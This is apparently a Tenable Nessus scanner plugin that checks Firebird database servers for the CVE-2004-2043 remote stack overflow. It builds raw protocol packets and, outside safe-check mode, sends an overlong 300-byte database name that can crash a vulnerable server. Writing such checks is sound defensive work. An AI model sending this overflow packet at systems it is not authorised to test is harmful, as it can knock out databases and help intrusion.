#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12246);
 script_cve_id("CVE-2004-2043");
 script_bugtraq_id(10446);
 script_osvdb_id(6408, 6624);
 script_version ("$Revision: 1.19 $");
 script_name(english:"Firebird DB Remote Database Name Overflow");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Firebird database.  The remote version of
this service is vulnerable to a remote stack-based overflow. 

An attacker, exploiting this hole, would be given full access to the
target machine.  Versions of Firebird database less than 1.5.0 are
reportedly vulnerable to this overflow." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.5.0 or higher." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/05/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/06/17");
 script_cvs_date("$Date: 2012/06/05 23:05:00 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:firebirdsql:firebird");
script_end_attributes();


 summary["english"] = "Firebird DB remote buffer overflow";
 script_summary(english:summary["english"]);

 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004-2012 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_dependencie("find_service1.nasl");
 script_require_ports(3050,139,445);
 exit(0);
}


# start script


port = 3050;
if (!get_tcp_port_state(port)) exit(0);

DEBUG = 0;

function firebird_request(myuser,myfile, ptype)
{
	local_var myfilelen, myuserlen, opcode, r, req, req2, soc;
	local_var machinename, mymachinelen, mynamelen, name;
	local_var stuff1, stuff2, stuff3, stuff4;

	req = req2 = NULL;
	opcode = raw_string(0x00,0x00,0x00,0x01);
	stuff1 = raw_string(0x00,0x00,0x00,0x13,0x00,0x00,
	                    0x00,0x02,0x00,0x00,0x00,0x1d,
                            0x00,0x00,0x00);

	myfilelen = raw_string(strlen(myfile));
       	stuff2 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,
	                    0x02,0x00,0x00,0x00,0x1a,0x01);

	name = string("SCAN CHECK");
	name += raw_string(0x04);
	mynamelen = raw_string(strlen(name));
	machinename = string("nessusscan");
	mymachinelen = raw_string(strlen(machinename));

        req = opcode + stuff1 + myfilelen + myfile + stuff2 + mynamelen +
              name + mymachinelen + machinename;

	req += raw_string(0x06,0x00,0x00,0x00,0x00,0x00,0x00,
                          0x08,0x00,0x00,0x00,0x01,0x00,0x00,
                          0x00,0x02,0x00,0x00,0x00,0x03,0x00,
		          0x00,0x00,0x02,0x00,0x00,0x00,0x0a,
                          0x00,0x00,0x00,0x01,0x00,0x00,0x00,
		          0x02,0x00,0x00,0x00,0x03,0x00,0x00,
                          0x00,0x04);

	if (ptype == "attach")
	{
 		opcode = raw_string(0x00,0x00,0x00,0x13);
		stuff1 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00);
                myfilelen = raw_string(strlen(myfile));
		stuff2 = raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x20,
                                    0x01,0x1c);
		myuserlen = raw_string(strlen(myuser), 0x1e);
	 	stuff3 = string("yWIQESaQ6ty");
		stuff4 = raw_string(0x3a,0x04,0x00,0x00,0x00,0x00,0x3e,0x00);	
		req2 = opcode + stuff1 + myfilelen + myfile + stuff2 + myuserlen +
		      myuser + stuff3 + stuff4;
	}
			
				
        soc = open_sock_tcp(port);
        if (! soc)
	{
		if (DEBUG)
		{
			display("can't open a socket to remote host\n");
		}
	        return("ERROR"); 
	}

        send(socket:soc, data:req);

	if (ptype == "attach")
	{
		r = recv(socket:soc, length:16);
		if ( r && (ord(r[3]) == 3) )
		{
			send(socket:soc, data:req2);
		}
		else
		{
			close(soc);

			if (DEBUG)
			{
				display("did not receive a reply after connect packet\n");
			}

			return("ERROR");
		}
	}

	r = recv(socket:soc, length:16);

	close(soc);

	if (strlen(r) > 4)
	{
		return(r);
	}
	else
	{
		if (DEBUG)
		{
			display(string("recv only returned ", strlen(r), " bytes\n"));
		}
		return("ERROR");
	}
}
	        
	        

	


reply = firebird_request(myfile:"nessusr0x", ptype:"connect");

if (reply == "ERROR")
	exit(0);

if (  ( ord(reply[0]) == 0) &&
      ( ord(reply[1]) == 0) &&
      ( ord(reply[2]) == 0) &&
      ( ord(reply[3]) == 3)   ) 
{
	exit(0);
}


if ( safe_checks() )
{
	# patched systems will *not* respond to a 299 byte filename request 
	reply = firebird_request(myuser:"nessusr0x" ,myfile:string(crap(299)), ptype:"attach");
	
	if (reply == "ERROR")
		exit(0);

	if (strlen(reply) > 0)
	{
		security_hole(port);
		exit(0);
	}

}
else
{
	reply = firebird_request(myuser:"nessusr0x" ,myfile:string(crap(300)), ptype:"attach");
	if (DEBUG)
	{
		display("sent malicious attach packet\n");
	}

	reply = firebird_request(myfile:"nessusr0x", ptype:"connect");

	if (DEBUG)
	{
		display("sending final connect request to DB\n");
	}

	if (reply == "ERROR")
	{
		security_hole(port);
		exit(0);
	}
}








